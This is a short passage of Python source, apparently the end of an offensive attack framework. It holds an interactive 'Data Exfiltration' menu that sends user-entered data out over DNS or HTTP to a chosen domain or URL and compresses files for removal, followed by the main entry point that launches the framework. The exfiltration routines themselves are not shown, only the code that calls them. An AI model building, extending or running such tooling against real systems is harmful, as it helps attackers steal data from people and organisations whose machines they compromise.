        print("\n--- Data Exfiltration ---")
        print("1. DNS Exfiltration")
        print("2. HTTP Exfiltration")
        print("3. Compress Files")
        print("0. Back")
        
        choice = input("Select option: ").strip()
        
        if choice == "1":
            data = input("Enter data to exfiltrate: ").strip()
            domain = input("Enter target domain: ").strip()
            self.exfiltrator.exfiltrate_via_dns(data, domain)
        elif choice == "2":
            data = input("Enter data to exfiltrate: ").strip()
            url = input("Enter target URL: ").strip()
            self.exfiltrator.exfiltrate_via_http(data, url)
        elif choice == "3":
            files_input = input("Enter files (comma-separated): ").strip()
            files = [f.strip() for f in files_input.split(",")]
            compressed = self.exfiltrator.zip_and_compress(files)
            if compressed:
                print(f"Compressed size: {len(compressed)} bytes")


def main():
    """Main entry point."""
    framework = FrameworkCore()
    framework.run()


if __name__ == "__main__":
    main()